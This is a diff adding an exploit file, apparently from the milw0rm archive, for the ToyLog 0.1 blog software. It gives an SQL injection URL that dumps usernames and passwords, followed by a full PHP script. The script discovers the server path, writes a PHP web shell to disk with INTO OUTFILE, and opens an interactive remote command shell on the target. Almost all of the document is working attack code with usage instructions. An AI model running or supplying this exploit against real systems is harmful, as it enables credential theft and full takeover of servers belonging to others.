@@ -1,0 +1,82 @@
+--+++=====================================================================================+++--
+--+++====== ToyLog 0.1 SQL Injection Vulnerability/Remote Command Execution Exploit ======+++--
+--+++=====================================================================================+++--
+
+[+] SQL Injection Vulnerability
+Url: http://localhost/ToyLog/read.php?idm=1%20UNION%20ALL%20SELECT%201,username,password,4%20FROM%20user
+
+[+] Remote Command Execution Exploit
+
+#!/usr/bin/php
+<?php
+
+function usage () {
+	exit (	"\n".
+		"+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n".
+		"-                                                   -\n".
+		"+ ToyLog 0.1 Remote Command Execution Exploit       +\n".
+		"- Author  : darkjoker                               -\n".
+		"+ Site    : http://darkjoker.net23.net              +\n".
+		"- Download: http://sourceforge.net/projects/toylog/ -\n".
+		"+ Usage   : php xpl.php <url>                       +\n".
+		"- Ex.     : php xpl.php http://localhost/ToyLog/    -\n".
+		"+                                                   +\n".
+		"-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\n".
+		"\n");
+}
+
+function hex_format ($string) {
+	$i=0;
+	while ($i<strlen($string)) 
+		$hex .= "%".dechex(ord($string[$i++]));
+	return $hex;
+}
+
+function get_path ($host, $dir) {
+	$fp = fsockopen ($host, 80);
+	$query = hex_format ("1 UNION ALL SELECT * FROM does_not_exist");
+	$req =	"GET {$dir}read.php?idm={$query} HTTP/1.1\r\n".
+		"Host: {$host}\r\n".
+		"Connection: Close\r\n\r\n";
+	fputs ($fp, $req);
+	while (!feof ($fp)) 
+		if (preg_match ("|resource in <b>(.+?)</b> on|", fgets ($fp, 1024), $data))
+			$path = $data [1];
+	list ($path) = explode ("block/db.php", $path);
+	fclose ($fp);
+	return $path;
+}
+
+function upload_shell ($host, $dir) {
+	$fp = fsockopen ($host, 80);
+	$shell_path = get_path ($host, $dir)."shell.php";
+	if (!strcmp ($shell_path, "shell.php"))
+		die ("[-] Exploit failed.\n");
+	$query = hex_format('1 UNION ALL SELECT 1,2,\'xxx<?php system (stripslashes($_GET[\\\'cmd\\\'])); ?>xxx\',4 INTO OUTFILE \''.$shell_path.'\' FROM post');
+	$req =	"GET {$dir}read.php?idm={$query} HTTP/1.1\r\n".
+		"Host: {$host}\r\n".
+		"Connection: Close\r\n\r\n";
+	fputs ($fp, $req);
+	fclose ($fp);
+}
+
+if (!preg_match ("|http://(.+?)(/.+/)|", $argv [1], $data))
+	usage ();
+array_shift ($data);
+list ($host, $dir) = $data;
+upload_shell ($host, $dir);
+$stdin = fopen ("php://stdin", "r");
+while (1) {
+	echo "backdoor@{$host}: ";
+	$cmd = hex_format(trim (fgets ($stdin, 1024)));
+	if (!strcmp ($cmd, hex_format("exit")))
+		break;
+	$out = explode ("xxx", file_get_contents ("http://{$host}{$dir}shell.php?cmd={$cmd}"));
+	array_shift ($out);
+	array_pop ($out);
+	echo $out [0];
+}
+
+?>
+
+# milw0rm.com [2009-07-10]
